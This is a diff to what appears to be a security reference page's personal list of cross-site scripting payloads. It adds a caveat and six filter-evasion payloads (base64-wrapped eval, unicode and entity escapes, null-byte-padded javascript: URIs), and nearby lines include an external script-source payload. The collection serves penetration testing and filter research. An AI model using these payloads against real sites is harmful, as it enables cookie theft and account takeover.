@@ -39,6 +39,9 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <summary>🔴 Click to view my personal custom list of XSS Payloads</summary>
 
   ```
+  --- Important Note ---
+  --- Please do consider that those payloads are used not for fuzzing nor to be added to a wordlist, ---
+  --- there are many payloads here that would need additional actions to properly work. ---
   <script>alert(document.domain+"\n\n"+document.cookie);<script>
   </script><svg><script/class=rodric>alert(1)</script>-%26apos;
   </SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
@@ -232,6 +235,12 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
   "><svg onload=document.forms[1].action='http://localhost/?Hacked'>
   ">&lt;<![\CDATA[<]]>img src=x onerror=prompt(document.domain)&gt;
+  <svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+  <svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+  <svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+  <img/src=`%00`%20onerror=this.onerror=confirm(1)
+  <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+  <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
   ```
 </details>
 
